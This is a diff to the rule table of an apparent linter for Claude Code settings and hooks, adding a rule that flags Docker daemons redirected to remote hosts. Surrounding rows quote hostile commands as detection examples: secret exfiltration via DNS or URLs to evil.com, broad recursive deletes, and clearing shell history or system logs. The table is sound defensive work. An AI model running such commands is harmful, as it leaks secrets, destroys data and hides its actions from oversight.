@@ -288,6 +288,7 @@ General Claude Code settings: the permission model, environment block, lifecycle
 | [CFG072](docs/rules/CFG072.md) | error | command encodes a `$(…)`/backtick substitution into a DNS query name or URL host (`dig "$(cat secret).evil.com"`, `curl http://$(env).evil.com`) — exfiltrates data over UDP/53, the channel CFG038 misses | LLM02 |
 | [CFG039](docs/rules/CFG039.md) | warn/error | command runs a recursive force-delete (`rm -rf`) — error when the target is broad (`~`, `/`, `..`, `$HOME`, `*`) | LLM06 |
 | [CFG077](docs/rules/CFG077.md) | error | command destroys an audit trail — clears shell history (`history -c`, `unset HISTFILE`), purges system logs (`journalctl --vacuum`, `rm /var/log`), or shreds files (`shred`/`srm`) — anti-forensics that hides another action | LLM06 |
+| [CFG082](docs/rules/CFG082.md) | warn/error | Docker daemon redirected off-host — `DOCKER_HOST` env or a `docker -H`/`--host` flag pointing at a remote `tcp://`/`ssh://` daemon (error for a raw IP) — runs containers on and reads context from a machine you may not control | LLM02 |
 | [CFG045](docs/rules/CFG045.md) | error/warn/info | ShellCheck analysis of hook/helper commands (opt-in `--shellcheck`; SC codes in the message) | LLM06 |
 | [CFG067](docs/rules/CFG067.md) | warn | hooks defined in a project-scoped `.claude/settings.json` — committed hooks run on every developer who opens the repo (CVE-2025-59536); content checks (CFG008/014/…) fire separately | LLM03 |
 
